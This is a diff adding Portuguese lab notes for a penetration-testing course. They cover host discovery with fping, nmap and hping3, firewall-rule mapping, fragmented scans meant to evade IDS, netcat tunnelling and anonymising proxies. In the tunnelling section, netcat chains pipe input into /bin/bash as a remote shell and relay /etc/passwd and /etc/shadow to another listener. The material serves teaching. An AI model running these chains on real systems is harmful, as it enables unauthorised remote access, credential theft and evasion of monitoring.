@@ -1,0 +1,369 @@
+Varreduras
+==========
+
+Ativas
+
+Passivas
+
+Furtivas
+
+Objetivos
+=========
+
+* Mepear hosts ativos na rede
+* Obter as versões dos S.O.
+* Entender a aquisição de banners
+* Identificar os serviços em execução
+
+
+Varredura ICMP
+
+Ping echo request (type8) responde echo replay (type0)
+
+podemos usar o fping para verificar todos os hosts ativos de uma rede
+
+vamos executar o comando script para podemos amarzenar os logs
+
+# script varreduras_data
+
+fping -f arquivo_armazenado_ips 2>/dev/null --> Ping para multiplos hosts
+
+fping -c1 -g 192.168.5.0/24 2> /dev/null > /tmp/ip_net.txt --> especifica uma range de ip
+
+estamos definindo 1 ping para cada host com a opção -c1 isso é bom para não sobrecarregarmos a rede nem levantar suspeitas nos dispositivos de contramedidas.
+-g informa que estamos passando uma range de ip em vez de um arquivo com ip com a opção -f
+
+
+nmap -sP 192.168.5.0/24 --> semelhante ao de cima porém usando o nmap
+
+* vamos bloqear o echo request
+
+iptables -A INPUT -p icmp --icmp-type 8 -d 192.168.5.x -j DROP
+
+Sites para descobrir os vendors pelo MAC ADDR ou quais são os prefixos dos vendirs
+http://www.coffer.com/mac_find/
+http://curreedy.com/stu/nic/
+
+exemplo:
+
+	fping -c1 -g 192.168.5.0/24 2> /dev/null > /tmp/net_ip.txt
+	cat /tmp/net_ip.txt
+
+	nmap -sP 192.168.5.0/24
+
+no metasploitable
+	iptables -A INPUT -p icmp --icmp-type 8 -d 192.168.5.x -j DROP
+
+	refaz os teste e mostra que o fping não acha mais a máquina porém o nmap pegou. Mostre para eles que os potrocolos tem suas caracteristicas e o nmap faz a validação de tudo isso.
+
+http://www.iana.org/assignments/icmp-parameters/icmp-parameters.xml
+
+	ping IP_Ex_Inexistente
+
+Pinging 10.10.10.10 with 32 bytes of data:
+Request timed out.
+Request timed out.
+Request timed out.
+OBS: ICMP Type 11	Time Exceeded	[RFC792]
+
+Pinging 10.1.4.254 with 32 bytes of data:
+Reply from 10.1.4.114: Destination host unreachable.
+Reply from 10.1.4.114: Destination host unreachable.
+Reply from 10.1.4.114: Destination host unreachable.
+Reply from 10.1.4.114: Destination host unreachable.
+OBS: ICMP Type 3	Destination Unreachable	[RFC792]
+
+Mesmo a máquina não existindo existe um retorno ICMP (ele é conhecido como um protocolo de relatório do IP) e quando não existe resposta nenhuma já da para deduzir que existe algum host com esse IP e que por algum motivo ele não esta se comportando como deveria.
+
+
+Veja que a máquina não existe e enviou de volta um icmp timeout
+
+
+após isso limpe as regras
+	iptables -F
+	iptables -nL
+
+
+Varrefura TCP
+=============
+
+usa para isso o 3 way handshake
+
+Syn -->
+    <-- Syn/ACK
+ACK -->
+
+
+sempre que enviamos o SYN a máquina com o serviço deverá responde SYN/ACK se a porta estiver aberta ou RST se fechada (execeto M$) RFC 793
+
+	hping3 --syn -c 1 -p 80 192.168.5.146
+	flags=SA = Syn/Ack
+
+	nmap -p 80 192.168.5.146
+	open
+
+	hping --syn -c 1 -p 81 192.168.5.146
+	flags=RA
+
+	nmap -p 81 192.168.5.146
+	close
+
+
+Varredura NMAP
+==============
+
+-sP --> Ping Scan
+
+-sV --> Version detected
+
+-sS --> TCP Syn scan
+
+-sT --> TCP connecte() scan
+
+-sU --> UDP scan
+
+-sF, -sX, -sN --> Stealth FIN, XMAS Tree ou Null
+
+-T <Paranoid|Sneaky|Polite|Normal|Agressive|Insane> -> Quantos pacotes serão enviados por segundo
+	Paranoid -> -T0
+	Sneaky -> -T1
+	Polite -> -T2
+	Normal -> -T3
+	Agressive -> -T4
+	Insane -> -T5
+
+Opções Interessantes:
+-p --> Utilizado para especificar portas. podemos usar uma porta, um intervalo de porta ou portas (-p 80|-p 80-8080|-p 135, 137,139,445)
+-O --> Mostrar a versão do S.O.
+-P0 ou -PN --> Desativar ICMP tipo 8 e o TCP ACK na porta 80
+
+
+TESTE
+=====
+
+Porta DROP
+	iptables -A INPUT -p tcp --dport 21 -j DROP
+
+Porta REJECT
+	iptables -A INPUT -p tcp --dport 111 -j REJECT
+
+Porta REJECT com TCP-RESET
+	iptables -A INPUT -p tcp --dport 22 -j REJECT --reject-with tcp-reset
+
+
+Isso serve para mapeamos regras de firewall no alvo
+
+Porta em DROP:
+	hping3 --syn -c 1 -p 21 Ip_metasploitable
+	Nnull
+	
+	nmap -p 21 ip_metasploitable
+	filtered
+
+Porta em REJECT:
+	hping3 --syn -c 1 -p 111 Ip_metasploitable
+	ICMP Port Unreacheble (type 3/3)
+	
+	nmap -p 111 ip_metasploitable
+	filtered
+
+Porta em REJECT com TCP-RESET
+	hping3 --syn -c 1 -p 22 Ip_metasploitable
+	flags= RA
+	
+	nmap -p 22 ip_metasploitable
+	closed
+
+no metasploitable
+	netstat -nlpt
+	tcp 0 0 ::22 PID/ssh <-- Esta em listen
+
+	iptables -nL
+	veja que o padrão do REJECT é o icmp port unreachable porém forçamos a resposta da segunda regra de REJECT com tcp RESET.
+
+
+Vamos fazer as varreduras furtivas agora:
+
+	nmap -sM -f -p 80 192.168.5.129
+	PORT   STATE         SERVICE
+	80/tcp open|filtered http
+
+	nmap -sM -f -p 81 192.168.5.129
+	PORT   STATE  SERVICE
+	81/tcp closed hosts2-ns 
+
+
+A opção -f faz com que o scan solicitado (incluindo scans usando ping) utilize pequenos pacotes IP fragmentados. A idéia é dividir o cabeçalho TCP em diversos pacotes para tornar mais difícil para os filtros de pacotes, os sistemas de detecção de intrusão, e outros aborrecimentos, detectar o que você está fazendo. Tenha cuidado com isto! Alguns programas tem problemas para lidar com estes pequenos pacotes. Especifique esta opção uma vez e o Nmap dividirá os pacotes em 8 bytes ou menos após o cabeçalho IP.
+
+
+Tunelamento
+===========
+
+Tunelamento é a técnica de encapsular conjuntos de dados que trafegam em rede. Essa técnica pode usar para:
+	* Proteger dados com criptografia em uma infra que não permita
+	* Realizar uma conexão com um protocolo bloqueado
+	* Bypassar o bloqueio
+	* Fazer uma comunicação reversa
+	* Mascaramento de IP
+
+APPS
+	* Netcat
+	* OpenSSH (shellremoto e tunél crypt)
+	* Httptunnel
+	* Corkcrew (tunela SSH em HTTP)
+	* ICMPTX
+	* NSTX
+	* ptunnel
+
+paginas
+	http://thomer.com/icmptx/
+	http://thomer.com/howtos/nstx.html
+
+Vamos usar como exemplo o netcat para um entendimento + o ideal é que cada um faça uso das ferramentas apresentada para ver como funciona.
+
+Abra 3 terminais:
+
+	T1 (Máquina local)
+	nc -l -vv -p 1026 | /bin/bash
+
+	T2 (Servidor Gateway (localhoot = ip remoto))
+	nc -l -vv -p 1025 | nc localhost 1026
+
+	T3(Servidor Remoto) 
+	nc localhost 1025
+
+	
+
++----+         +----+         +----+
+|    |         |    |         |    |
+|HOST|         |HOST|         |HOST| ls /etc/;cat /etc/passwd
+| LC |<--1025--| GW |<--1026--|RMT |
+|    |         |    |         |    |
+|    |    +--->|    |----+    |    |
++----+    |    +----+    |    +----+
+          +-1026 to 1025-+
+
+Abra mais 1 terminais:
+
+	T1 (Máquina local)
+	nc -l -vv -p 1026 | /bin/bash | nc  localhost 5555
+
+	T2 (Servidor Gateway (localhoot = ip remoto))
+	nc -l -vv -p 1025 | nc localhost 1026
+
+	T3(Servidor Remoto) 
+	nc localhost 1025
+	ls /etc
+	cat /etc/passwd
+
+
+	T4 (Servidor Remoto)
+	nc -l -vv -p 5555
+	saida do ls /etc/
+	saida do cat /etc/passwd
+
+  +-------------5555------------+
+  |                             V
++----+         +----+         +----+
+|    |         |    |         |    |
+|HOST|         |HOST|         |HOST| ls /etc/;cat /etc/passwd
+| LC |<--1025--| GW |<--1026--|RMT |
+|    |         |    |         |    |
+|    |    +--->|    |----+    |    |
++----+    |    +----+    |    +----+
+          +-1026 to 1025-+
+
+OBS Mostre que se você ele não encadear os NetCat e tentar fazer isso após o acesso não funciona.
+
+
+demostre os file descriptor
+
+os padrões:
+	0 -> Entrada padrão
+	1 -> Saída padrão
+	2 -> Saida erro padrão
+
+strace cat /etc/passwd
+
+read(3, "root:x:0:0:root:/root:/bin/bash\n"..., 32768) = 1347 --> Leu o arquivo
+write(1, "root:x:0:0:root:/root:/bin/bash\n"..., 1347) = 1347 --> mostrou no monitor
+
+Abra 4 terminais:
+
+	T1 (Máquina local)
+	nc -l -vv -p 1026 | /bin/bash
+
+	T2 (Servidor Gateway (localhoot = ip remoto))
+	nc -l -vv -p 1025 | nc localhost 1026
+
+	T3(Servidor Remoto) 
+	nc localhost 1025
+	exec 4>/tmp/saida.txt
+	exec 1>&4
+	tail -f /tmp/saida.txt | nc localhost 5555 &
+	ls /etc
+	cat /etc/shadow
+
+
+
+	T4 (Servidor Remoto)
+	nc -l -vv -p 5555
+	
+  +-----FD------5555------------+
+  |                             V
++----+         +----+         +----+
+|    |         |    |         |    |
+|HOST|         |HOST|         |HOST| ls /etc/;cat /etc/passwd
+| LC |<--1025--| GW |<--1026--|RMT |
+|    |         |    |         |    |
+|    |    +--->|    |----+    |    |
++----+    |    +----+    |    +----+
+          +-1026 to 1025-+
+
+Anonimato (Anonymizer)
+======================
+
+Os programas de anonymizer são usados para que possamos navegar ocultando nossos dados.
+
+Normalmente se faz uso de um proxy mascarando nosso ip e entregando o ip do proxy como o ip real da conexão.
+
+Programas:	
+	* TOR - The Onion Router (http://torproject.org)
+	* Privoxy (http://www.privoxy.org)
+
+tem um bom tutorial do cabelo
+	www.vivaolinux.com.br/artigo/TOR-A-internet-sem-rastreabilidade/
+
+Vamos a uma prática:
+
+acesse o site www.showmyip.com para vermos qual endereço ip estamos usando, e entre no site www.geoiptool.com/pt/ para ver a localidade.
+
+agora instale o anon-proxy
+	aptitude install anon-proxy
+
+Entre no navegador e configure o proxy para localhost na porta 4001
+
+Acesse novamente o site www.showmyip.com para ver com qual ip estamos navegando agora e entre novamente no site www.geoiptool.com/pt/ para ver a localidade.
+
+Outra forma é usando a página do Proxy 4 Free (http;//www.proxy4free.com) nele tem uma lista de proxys que podem ser usadas, sua confiabilidade e tudo mais.
+
+Tem outro que eu costumo usar para testar desafios que é o http://www.freeproxylists.net/ onde vc ve todas as informações na página inicial.
+
+para usar estes proxys basta configurar direto no browser ou instalar plugins que faça isso, onde você vai cadastrando seus proxys favoritos e usa com dois cliques.
+
+Plugins para o Firefox:
+	* Foxyproxy Standard 3.5
+	* QuickProxy
+
+Contramedidas
+=============
+
+Manter regras de Firewall bem configuradas
+
+Não permitir que o usuário tenha acesso as configurações de proxy.
+
+Manter IDS bem configurado e leia os logs
+
+E o mais importante tenha politicas claras e bem divulgados para seus colaboradores, e que haja punições no descumprimentos delas.
+
+
